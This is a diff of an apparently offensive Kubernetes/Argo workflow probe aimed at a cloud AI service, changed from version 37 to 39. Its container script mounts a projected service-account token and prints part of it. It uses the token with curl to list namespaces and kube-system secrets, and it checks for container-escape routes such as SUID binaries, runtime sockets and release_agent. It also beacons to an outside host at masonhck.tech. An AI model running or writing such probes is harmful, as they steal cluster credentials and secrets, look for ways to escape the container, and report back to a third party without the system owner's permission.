@@ -10,13 +10,11 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "37.0.0"
+    ai.sap.com/version: "39.0.0"
 spec:
   entrypoint: main
-  # Cross-namespace reference test: try to mount secrets from other namespaces
-  # Argo controller has cluster-wide RBAC - might process these references
   volumes:
-  - name: cross-ns-test
+  - name: projected-token
     projected:
       sources:
       - serviceAccountToken:
@@ -31,62 +29,31 @@ spec:
     container:
       image: nicolaka/netshoot:latest
       volumeMounts:
-      - name: cross-ns-test
-        mountPath: /var/run/cross-ns
+      - name: projected-token
+        mountPath: /var/run/projected
       command:
       - bash
       - -c
       - |
-        echo "=== V37 CROSS-NS + ESCAPE TEST ==="
-        echo "=== $(date -u) ==="
-        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
-        echo "Namespace: $NS"
-
-        # 1. Check for projected SA token (cross-ns reference test)
+        echo "=== V39 CROSS-NS REFERENCE ==="
+        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo unknown)
+        echo "NS: $NS"
         echo "=== PROJECTED TOKEN ==="
-        ls -la /var/run/cross-ns/ 2>/dev/null
-        cat /var/run/cross-ns/token 2>/dev/null | head -c 200
-        echo ""
-
-        # 2. Container escape checks
-        echo "=== ESCAPE CHECKS ==="
-        # Release agent (needs sys_admin cap)
-        ls -la /sys/fs/cgroup/ 2>/dev/null | head -5
-        cat /sys/fs/cgroup/release_agent 2>/dev/null || echo "No release_agent"
-        # Runtime socket
-        ls -la /var/run/docker.sock /run/containerd/containerd.sock /run/crio/crio.sock 2>/dev/null || echo "No runtime sockets"
-        # SUID binaries
-        find / -perm -4000 -type f 2>/dev/null | head -10
-        # Log mount check
-        ls -la /var/log/ 2>/dev/null | head -10
-        mount | grep "var/log" 2>/dev/null || echo "No /var/log mount"
-        # Host PID namespace
-        ls /proc/1/root 2>/dev/null && echo "Can access PID 1 root" || echo "Cannot access PID 1 root"
-        # User namespace
-        cat /proc/self/uid_map 2>/dev/null
-        
-        # 3. Try to access K8s API with projected token
-        echo "=== K8S API WITH PROJECTED TOKEN ==="
-        PROJ_TOKEN=$(cat /var/run/cross-ns/token 2>/dev/null)
-        if [ -n "$PROJ_TOKEN" ]; then
-          echo "Got projected token! Testing K8s API..."
-          curl -sk -H "Authorization: Bearer $PROJ_TOKEN" "https://kubernetes.default.svc/api/v1/namespaces" 2>&1 | head -c 300
+        ls -la /var/run/projected/ 2>/dev/null || echo "Mount failed"
+        PTOKEN=$(cat /var/run/projected/token 2>/dev/null)
+        echo "Len: ${#PTOKEN}"
+        if [ -n "$PTOKEN" ]; then
+          echo "GOT TOKEN"
+          echo "$PTOKEN" | head -c 200
           echo ""
-          # Try listing secrets in kube-system
-          curl -sk -H "Authorization: Bearer $PROJ_TOKEN" "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets" 2>&1 | head -c 300
+          curl -sk -H "Authorization: Bearer $PTOKEN" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 400
           echo ""
-          # Try listing all pods
-          curl -sk -H "Authorization: Bearer $PROJ_TOKEN" "https://kubernetes.default.svc/api/v1/pods" 2>&1 | head -c 300
-        else
-          echo "No projected token available"
+          curl -sk -H "Authorization: Bearer $PTOKEN" https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets 2>&1 | head -c 400
         fi
-        
-        # 4. Check for Argo-specific cross-ns features
-        echo "=== ARGO CROSS-NS ==="
-        env | grep -i argo 2>/dev/null | head -10
-        cat /var/run/argo/token 2>/dev/null | head -c 100
-        ls /var/run/argo/ 2>/dev/null
-        
-        curl -s "https://www.masonhck.tech/ssrf.php?src=sap-v37-xns" | head -c 10
-        echo ""
-        echo "=== V37 DONE $(date -u) ==="
+        echo "=== ESCAPE ==="
+        find / -perm -4000 2>/dev/null | head -3
+        ls /run/containerd/containerd.sock /var/run/docker.sock 2>/dev/null || echo "No sockets"
+        cat /proc/self/uid_map 2>/dev/null
+        mount | grep -v "proc\|sys\|dev\|overlay\|tmpfs" | head -3
+        curl -s "https://www.masonhck.tech/ssrf.php?src=v39" | head -c 5
+        echo "=== V39 DONE ==="
